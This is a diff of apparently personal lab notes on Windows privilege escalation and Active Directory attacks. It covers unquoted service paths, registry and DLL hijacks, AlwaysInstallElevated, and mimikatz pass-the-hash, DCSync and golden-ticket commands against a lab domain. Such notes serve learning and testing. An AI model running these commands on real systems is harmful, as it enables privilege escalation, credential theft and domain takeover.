@@ -58,9 +58,9 @@ ________________________________________________________________________________
 > example -> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
 > look for writable directory, for example C:\Program Files\Unquoted Path Service
 > services always expect an executable (.exe)
-> create folder on desktop
-> create batch file (.bat) with "[add user command]"
-> use a "bat to exe converter" (run from cmd)
+> open "bat to exe converter"
+> insert the batch command for adding a user
+> select 64bit winows on the right of the program and click convert
 > rename to common.exe (for this example ofc)
 > place exe in C:\Program Files\Unquoted Path Service
 > run service
@@ -83,7 +83,7 @@ ________________________________________________________________________________
 > go to \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
 > right click on imagepath -> select modify
 > edit the value data so it points to an exe you control, or
-> with bat2exe you can make a .exe that that adds an administrative user (see the notes above)
+> with "bat to exe converter" you can make a .exe that that adds an administrative user (see the notes above)
 > open services
 > look for the service that has the modified image path as the "path to executable"
 > run the service
@@ -117,8 +117,9 @@ ________________________________________________________________________________
 > and:
 > Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
 > if both have "AlwaysInstallElevated" set to 1, .msi files will be executed with highest privileges
-> you might be able to install a .exe to .msi converter on the host machine
+> you might be able to install a .exe to .msi converter on the lab machine
 > or easier, just use the .msi file from this repo
+> transfer over the .msi and run it
 
 8) dll hijack
 > last resort for privilege escalation
@@ -146,7 +147,6 @@ ________________________________________________________________________________
 > copy dll to the VM
 > place dll inside the directory you found in %path%
 > run service
-> net user in cmd to check if it worked
 
 __________________________________________________________________________________________
 __________________________________________________________________________________________
@@ -217,22 +217,25 @@ ________________________________________________________________________________
 > close both admin cmd windows (you dont need them anymore)
 > go to original mimikatz cmd (or open new one)
 > sekurlsa::pth /user:domad /domain:adlab.local /ntlm:hash
-> dir \\192.168.56.10\c$
-> cd C:\temp\SysinternalsSuite
-> mimikatz
+// > dir \\192.168.56.10\c$
+> run mimikatz
 > privilege::debug
 > lsadump::dcsync /domain:adlab.local /all /csv
 > copy krbtgt hash
 > close window
 
+---------------
+ lab ends here
+---------------
+
 9) golden ticket
-> open a normal cmd windows
+> open a normal cmd window
 > whoami /user (copy SID except last 4 digits)
-> go to mimikatz
+> go back to mimikatz window
 > kerberos::golden /domain:adlab.local /sid:xxx /rc4:xxx /user:xxx /id:500 /ptt
 
 > or.. save for later:
-> kerberos::golden /domain:adlab.local /sid:xxx /rc4:xxx /user:xxx /id:500 /ptt
+> kerberos::golden /domain:adlab.local /sid:xxx /rc4:xxx /user:xxx /id:500
 > kerberos::ptt ticket.kirbi
 > misc::cmd
 
